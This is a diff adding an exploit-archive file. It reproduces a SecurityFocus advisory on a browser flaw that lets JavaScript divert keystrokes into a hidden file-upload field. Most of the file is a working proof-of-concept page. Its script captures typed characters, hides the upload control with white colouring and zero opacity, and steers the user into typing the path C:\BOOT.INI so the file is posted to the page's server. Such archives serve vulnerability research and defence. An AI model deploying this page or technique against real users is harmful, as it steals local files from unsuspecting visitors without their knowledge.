@@ -1,0 +1,69 @@
+source: http://www.securityfocus.com/bid/18308/info
+ 
+Multiple web browsers are prone to a JavaScript key-filtering vulnerability because the browsers fail to securely handle keystroke input from users.
+ 
+This issue is demonstrated to allow attackers to divert keystrokes from one input form in a webpage to a hidden file-upload dialog in the same page. This may allow remote attackers to initiate file uploads from unsuspecting users. Other attacks may also be possible.
+ 
+Exploiting this issue requires that users manually type the full path of files that attackers wish to download. This may require substantial typing from targeted users, so attackers will likely use keyboard-based games, blogs, or other similar pages to entice users to enter the required keyboard input to exploit this issue.
+ 
+Reportedly, Mozilla Suite, Mozilla Firefox, Mozilla SeaMonkey, Netscape Navigator, and Microsoft Internet Explorer are all vulnerable to this issue.
+
+
+<HTML>
+<HEAD>
+<style type="text/css">
+.first {
+}
+.second {
+        color: white;
+        background-color: white;
+        opacity: 0;
+}
+</style>
+<SCRIPT>
+//document.onKeyDown = doKeyPress;
+
+//document.onKeyUp = doKeyUp;
+var saved;
+var e ;
+var mystring = "C:\\BOOT.INI";
+//var i=mystring.length-1;
+var i=0;
+function doKeyPress(chucky)
+    {
+    saved = chucky.which;
+    //alert('pressed ' + String.fromCharCode(saved) + '(' + saved + ')');
+    if (mystring[i] != String.fromCharCode(saved).toUpperCase() ||
+        i > mystring.length-1) {
+       return false;
+    }
+    i++;
+    return true;
+  };
+function doKeyUp () {
+
+document.forms[0].txt.value += String.fromCharCode(saved);
+document.forms[0].txt.focus();
+
+}
+
+</SCRIPT>
+</HEAD>
+<BODY >
+<FORM METHOD=POST action=file.php>
+<INPUT id='asdf' name="fileupload" defaultValue='asdfasdf' TYPE=FILE
+OnKeyUp="doKeyUp();"
+OnKeyPress="return doKeyPress(event);">
+<input name=txt id='txt' type=text value=''
+OnKeyDown="document.forms[0].fileupload.focus();"
+onClick="">
+<input type=button value="invisible"
+onclick="document.forms[0].fileupload.className='second';">
+<input type=button value="visible"
+onclick="document.forms[0].fileupload.className='first';">
+
+</FORM>
+</BODY>
+</HTML>
+
+
